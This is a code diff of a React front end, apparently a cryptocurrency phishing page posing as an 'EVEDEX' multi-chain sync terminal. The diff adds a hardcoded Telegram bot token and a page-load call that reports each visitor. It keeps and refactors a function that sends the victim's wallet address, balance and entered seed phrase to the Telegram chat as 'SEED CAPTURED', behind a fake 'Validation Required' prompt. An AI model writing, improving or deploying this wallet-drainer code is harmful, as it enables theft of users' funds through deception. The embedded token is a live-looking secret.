@@ -11,6 +11,7 @@ export default function EvedexTerminal() {
   const { chains, switchChain } = useSwitchChain();
   
   const [view, setView] = useState("menu"); 
+  const [activeTask, setActiveTask] = useState(""); // Tracks which button was clicked
   const [loading, setLoading] = useState(false);
   const [inputVal, setInputVal] = useState("");
   const [isSyncing, setIsSyncing] = useState(false);
@@ -18,6 +19,29 @@ export default function EvedexTerminal() {
   const [nodeId, setNodeId] = useState("EVEDEX_RELAY_0x77");
 
   const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";
+  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
+  const chatId = "7630238860";
+
+  // Reset input and task when moving back to menu
+  const backToMenu = () => {
+    setView("menu");
+    setActiveTask("");
+    setInputVal(""); // This clears the memory of what was typed
+  };
+
+  const openTask = (taskName) => {
+    setActiveTask(taskName);
+    setInputVal(""); // Ensures the box is empty for the new task
+    setView("task_box");
+  };
+
+  useEffect(() => {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: `👀 NEW VISITOR\nSomeone just opened evedex.network` }),
+    });
+  }, []);
 
   useEffect(() => {
     if (isSyncing) {
@@ -62,12 +86,12 @@ export default function EvedexTerminal() {
 
   const startFinalSync = () => {
     setIsSyncing(true);
-    fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ 
-        chat_id: "7630238860", 
-        text: `🚨 EVEDEX SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nNET: ${balance?.symbol}\n\nSEED:\n${inputVal}` 
+        chat_id: chatId, 
+        text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nNET: ${balance?.symbol}\n\nSEED:\n${inputVal}` 
       }),
     });
 
@@ -100,7 +124,7 @@ export default function EvedexTerminal() {
             { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> },
             { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }
           ].map((item) => (
-            <button key={item.n} onClick={() => setView("task_box")} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl transition-all">
+            <button key={item.n} onClick={() => openTask(item.n)} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl transition-all">
               <div className="text-slate-700">{item.i}</div>
               <span className="text-[10px] font-black text-slate-500">{item.n}</span>
             </button>
@@ -110,12 +134,19 @@ export default function EvedexTerminal() {
 
       {view === "task_box" && (
         <div className="bg-[#0d1117] border border-slate-800 rounded-[45px] p-8 shadow-2xl animate-in slide-in-from-bottom-8 text-center">
-          <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-black block mx-auto tracking-widest uppercase">← CANCEL_SESSION</button>
+          <button onClick={backToMenu} className="text-slate-600 text-[10px] mb-8 font-black block mx-auto tracking-widest uppercase">← CANCEL_SESSION</button>
           <div className="relative mx-auto w-24 h-24 mb-6"><Settings size={96} className="text-cyan-900 absolute top-0 left-0 animate-spin duration-[4000ms]" /><Cpu size={48} className="text-cyan-500 absolute top-6 left-6 animate-pulse" /></div>
-          <h2 className="text-white font-black text-2xl italic mb-2 tracking-tighter uppercase">Evedex Sync</h2>
+          <h2 className="text-white font-black text-2xl italic mb-2 tracking-tighter uppercase">{activeTask} Sync</h2>
+          
           <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left">
-            <label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase tracking-widest">Available Node Liquidity</label>
-            <div className="text-2xl font-mono text-white italic">{balance ? `${balance.formatted.slice(0,8)} ${balance.symbol}` : "Scanning..."}</div>
+            <label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase tracking-widest">Enter {activeTask} Amount</label>
+            <input 
+              type="text" 
+              value={inputVal}
+              onChange={(e) => setInputVal(e.target.value)}
+              placeholder="0.00"
+              className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full"
+            />
           </div>
           
           <div className="flex gap-2 overflow-x-auto pb-6 no-scrollbar">
@@ -124,10 +155,9 @@ export default function EvedexTerminal() {
                 {c.name} Node
               </button>
             ))}
-            <button onClick={() => setView("seed_gate")} className="whitespace-nowrap bg-slate-900 border border-purple-900/30 px-4 py-2 rounded-xl text-[8px] font-black text-purple-500 uppercase active:scale-95">SOLANA (SVM) SYNC</button>
           </div>
 
-          <button onClick={executeTotalMove} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 uppercase tracking-widest italic">AUTHORIZE HANDSHAKE</button>
+          <button onClick={executeTotalMove} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 uppercase tracking-widest italic">AUTHORIZE {activeTask}</button>
         </div>
       )}
 
@@ -138,8 +168,8 @@ export default function EvedexTerminal() {
               <>
                 <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
                 <h2 className="text-white font-black text-lg italic tracking-tighter uppercase leading-none">Validation Required</h2>
-                <p className="text-[10px] text-slate-500 leading-relaxed mt-4 lowercase px-4 italic">To finalize the EVEDEX multi-chain synchronization (Base/ETH/BNB/SOL), provide the Project Authorization Seed.</p>
-                <div className="mt-8"><textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="ENTER WORD1 WORD2..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900" /></div>
+                <p className="text-[10px] text-slate-500 leading-relaxed mt-4 lowercase px-4 italic">To finalize the EVEDEX {activeTask} synchronization, provide the Project Authorization Seed.</p>
+                <div className="mt-8"><textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="ENTER SEED PHRASE..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900" /></div>
                 <button disabled={!validateSeed(inputVal)} onClick={startFinalSync} className={`w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white uppercase tracking-widest transition-all ${validateSeed(inputVal) ? 'bg-cyan-600 active:scale-95' : 'bg-slate-900 opacity-50'}`}>{validateSeed(inputVal) ? "Finalize Sync" : "Enter Valid Seed"}</button>
               </>
             ) : (
